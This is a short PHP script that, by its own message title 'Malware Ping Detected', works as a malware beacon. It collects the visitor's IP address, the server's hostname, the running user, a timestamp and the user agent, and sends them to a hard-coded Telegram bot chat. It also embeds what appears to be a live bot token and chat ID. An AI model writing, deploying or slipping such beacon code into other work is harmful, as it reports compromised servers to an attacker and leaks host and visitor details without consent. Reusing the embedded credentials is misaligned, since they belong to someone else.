<?php
// Telegram Bot Info
$token = '7600396803:AAGIajzJr6Bvn4Ficw6heKWuuUvFjgsqVOw';
$chat_id = '7926968807'; // Replace this below after you get it

// Server Info
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$host = gethostname();
$user = get_current_user();
$timestamp = date('c');
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

// Message to Telegram
$message = "🚨 *Malware Ping Detected*\n"
         . "*IP:* `$ip`\n"
         . "*Host:* `$host`\n"
         . "*User:* `$user`\n"
         . "*Time:* `$timestamp`\n"
         . "*User-Agent:* `$ua`";

// Send message
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown',
]));
?>
